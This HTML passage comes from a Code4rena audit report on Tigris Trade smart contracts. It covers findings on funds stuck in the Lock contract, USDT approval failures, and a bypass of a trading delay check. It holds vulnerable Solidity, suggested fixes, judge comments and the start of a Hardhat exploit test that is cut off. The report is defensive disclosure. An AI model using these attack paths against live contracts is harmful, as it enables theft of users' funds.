href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/659#issuecomment-1407828021\">GainsGoblin (Tigris Trade) resolved</a>:</strong></p>\n<blockquote>\n<p>Mitigation: <a href=\"https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419177303\">https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419177303</a> </p>\n</blockquote>\n<hr>\n<h1 id=\"medium-risk-findings-24\" style=\"position:relative;\"><a href=\"#medium-risk-findings-24\" aria-label=\"medium risk findings 24 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Medium Risk Findings (24)</h1>\n<h2 id=\"m-01-locksol-claimgovfees-function-can-cause-assets-to-be-stuck-in-the-lock-contract\" style=\"position:relative;\"><a href=\"#m-01-locksol-claimgovfees-function-can-cause-assets-to-be-stuck-in-the-lock-contract\" aria-label=\"m 01 locksol claimgovfees function can cause assets to be stuck in the lock contract permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/73\">[M-01] Lock.sol: claimGovFees function can cause assets to be stuck in the Lock contract</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/73\">HollaDieWaldfee</a>, also found by <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/404\">__141345__</a> and <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/99\">0xdeadbeef0x</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L110\">https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L110</a> </p>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L215\">https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L215</a></p>\n<h3 id=\"impact-2\" style=\"position:relative;\"><a href=\"#impact-2\" aria-label=\"impact 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>When calling <a href=\"https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L110\"><code>Lock.claimGovFees</code></a>, assets that are set to be not allowed or assets that don’t have any shares yet in the <code>BondNFT</code> contract will cause a silent failure in <a href=\"https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L215\"><code>BondNFT.distribute</code></a>.</p>\n<p>The funds from the <code>GovNFT</code> contract will get transferred into the <code>Lock</code> contract and then will be stuck there. They cannot be recovered.</p>\n<h3 id=\"proof-of-concept-11\" style=\"position:relative;\"><a href=\"#proof-of-concept-11\" aria-label=\"proof of concept 11 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<ol>\n<li>An asset is added to the <code>BondNFT</code> contract by calling <a href=\"https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L349\"><code>BondNFT.addAsset</code></a></li>\n<li>There are no bonds yet for this asset so the amount of shares for the asset is zero</li>\n<li><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L110\"><code>Lock.claimGovFees</code></a> is called</li>\n<li>Funds are transferred from the <code>GovNFT</code> contract to the <a href=\"https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L115\"><code>Lock</code> contract</a></li>\n<li>\n<p>The call to <code>BondNFT.distribute</code> now fails quietly without reverting the transaction:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"28\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">totalShares</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_tigAsset</span><span class=\"mtk1\">] == </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> || !</span><span class=\"mtk12\">allowedAsset</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_tigAsset</span><span class=\"mtk1\">]) </span><span class=\"mtk15\">return</span><span class=\"mtk1\">;</span></span></span></code></pre>\n</li>\n<li>The funds are now stuck in the <code>Lock</code> contract. They cannot be recovered.</li>\n</ol>\n<h3 id=\"tools-used-6\" style=\"position:relative;\"><a href=\"#tools-used-6\" aria-label=\"tools used 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VS Code</p>\n<h3 id=\"recommended-mitigation-steps-11\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-11\" aria-label=\"recommended mitigation steps 11 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>A naive solution would be to use <code>revert</code> instead of <code>return</code> in <code>BondNFT.distribute</code> such that funds are either transferred from <code>GovNFT</code> to <code>Lock</code> and then to <code>BondNFT</code> or not at all.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"29\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     ) </span><span class=\"mtk12\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">-        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">totalShares</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_tigAsset</span><span class=\"mtk1\">] == </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> || !</span><span class=\"mtk12\">allowedAsset</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_tigAsset</span><span class=\"mtk1\">]) </span><span class=\"mtk15\">return</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">totalShares</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_tigAsset</span><span class=\"mtk1\">] == </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> || !</span><span class=\"mtk12\">allowedAsset</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_tigAsset</span><span class=\"mtk1\">]) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tigAsset</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk11\">_msgSender</span><span class=\"mtk1\">(), </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         </span><span class=\"mtk12\">unchecked</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">aEpoch</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> / </span><span class=\"mtk12\">DAY</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>This however is an incomplete fix because if there is a single “bad” asset, rewards for the other assets cannot be distributed either.</p>\n<p>Moreover functions like <code>Lock.lock</code> and <code>Lock.release</code> rely on <code>Lock.claimGovFees</code> to not revert.</p>\n<p>So you might allow the owner to rescue stuck tokens from the <code>Lock</code> contract. Of course only allow rescuing the balance of the <code>Lock</code> contract minus the <code>totalLocked</code> of the asset in the <code>Lock</code> contract such that the locked amount cannot be rescued.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/73#issuecomment-1362229612\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Looks off, the transferFrom would happen <a href=\"https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L215\">after the check</a>.</p>\n<p>If <code>totalShares</code> is zero, the funds will not be pulled.</p>\n<p>Will double check but looks invalid.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/73#issuecomment-1363636606\">TriHaz (Tigris Trade) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>@Alex the Entreprenerd it is valid, funds will not be pulled to <code>BondNFT</code>, but they will be stuck in <code>Lock</code>.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/73#issuecomment-1384498101\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The warden has shown how, whenever the <code>totalShares</code> for an asset are zero, or an asset is not allowed, the call to distribute will result in a no-op.</p>\n<p>Because <code>claimGovFees</code> uses a delta balance, this means that those tokens will be stuck in the Lock Contract.</p>\n<p>Because this finding shows a way to lose yield, due to an external condition, I agree with Medium Severity.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/73#issuecomment-1407131168\">GainsGoblin (Tigris Trade) resolved</a>:</strong></p>\n<blockquote>\n<p>Mitigation: <a href=\"https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419173369\">https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419173369</a> </p>\n</blockquote>\n<hr>\n<h2 id=\"m-02-must-approve-0-first\" style=\"position:relative;\"><a href=\"#m-02-must-approve-0-first\" aria-label=\"m 02 must approve 0 first permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/104\">[M-02] Must approve 0 first</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/104\">0x4non</a>, also found by <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/632\">kwhuo68</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/626\">eierina</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/586\">Deivitto</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/582\">0xNazgul</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/408\">__141345__</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/391\">imare</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/301\">cccz</a>, and <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/128\">rvierdiiev</a></em></p>\n<p>Some tokens (like USDT) do not work when changing the allowance from an existing non-zero allowance value. They must first be approved by zero and then the actual allowance must be approved.</p>\n<h3 id=\"proof-of-concept-12\" style=\"position:relative;\"><a href=\"#proof-of-concept-12\" aria-label=\"proof of concept 12 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Lock.sol#L117\">https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Lock.sol#L117</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"30\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">claimGovFees</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">assets</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">bondNFT</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getAssets</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">=</span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">assets</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">balanceBefore</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">assets</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]).</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">IGovNFT</span><span class=\"mtk1\">(</span><span class=\"mtk12\">govNFT</span><span class=\"mtk1\">).</span><span class=\"mtk11\">claim</span><span class=\"mtk1\">(</span><span class=\"mtk12\">assets</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">balanceAfter</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">assets</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]).</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">assets</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]).</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bondNFT</span><span class=\"mtk1\">), </span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span><span class=\"mtk1\">);</span><span class=\"mtk3\">// @audit this could fail always with some tokens, </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">bondNFT</span><span class=\"mtk1\">.</span><span class=\"mtk11\">distribute</span><span class=\"mtk1\">(</span><span class=\"mtk12\">assets</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">], </span><span class=\"mtk12\">balanceAfter</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">balanceBefore</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-12\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-12\" aria-label=\"recommended mitigation steps 12 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Add an <code>approve(0)</code> before approving;</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"31\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    function claimGovFees() public {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address[] memory assets = bondNFT.getAssets();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        for (uint i=0; i &lt; assets.length; i++) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            uint balanceBefore = IERC20(assets[i]).balanceOf(address(this));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            IGovNFT(govNFT).claim(assets[i]);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            uint balanceAfter = IERC20(assets[i]).balanceOf(address(this));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            IERC20(assets[i]).approve(address(bondNFT), 0);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            IERC20(assets[i]).approve(address(bondNFT), type(uint256).max);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            bondNFT.distribute(assets[i], balanceAfter - balanceBefore);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  }</span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/104#issuecomment-1382253859\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The Warden has shown how, due to the function approving max multiple times, certain tokens, that only allow a non-zero allowance to be set starting from zero, could revert.</p>\n<p>Because this depends on the token implementation, but there’s a reasonable chance to believe that USDT will be used, I agree with Medium Severity.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/104#issuecomment-1406959434\">GainsGoblin (Tigris Trade) confirmed</a>:</strong></p>\n<blockquote>\n<p>Since the purpose of the bonds is to lock tigAsset liquidity, only tigAsset tokens will be allowed to be locked, which don’t have this issue.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/104#issuecomment-1407862000\">GainsGoblin (Tigris Trade) resolved</a>:</strong></p>\n<blockquote>\n<p>Mitigation: <a href=\"https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419177578\">https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419177578</a> </p>\n</blockquote>\n<hr>\n<h2 id=\"m-03-bypass-the-delay-security-check-to-win-risk-free-funds\" style=\"position:relative;\"><a href=\"#m-03-bypass-the-delay-security-check-to-win-risk-free-funds\" aria-label=\"m 03 bypass the delay security check to win risk free funds permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/108\">[M-03] Bypass the delay security check to win risk free funds</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/108\">KingNFT</a>, also found by <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/495\">Critical</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/267\">chaduke</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/200\">0x52</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/49\">noot</a>, and <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/44\">orion</a></em></p>\n<p>The current implementation uses <code>_checkDelay()</code> function to prevent profitable opening and closing in the same tx with two different prices in the “valid signature pool”. But the protection is not enough, an attacker can long with low price and short with high price at the same tx but two orders to lock profit and take risk free funds.</p>\n<h3 id=\"proof-of-concept-13\" style=\"position:relative;\"><a href=\"#proof-of-concept-13\" aria-label=\"proof of concept 13 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The following test case and comments show the details for how to exploit it:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"32\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">const { expect } = require(&quot;chai&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">const { deployments, ethers, waffle } = require(&quot;hardhat&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">const { parseEther, formatEther } = ethers.utils;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">const { signERC2612Permit } = require(&#39;eth-permit&#39;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">describe(&quot;Bypass delay check to earn risk free profit&quot;, function () {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let owner;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let node;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let user;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let node2;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let node3;</span></span>\n<span class=\"grvsc-line\"><span 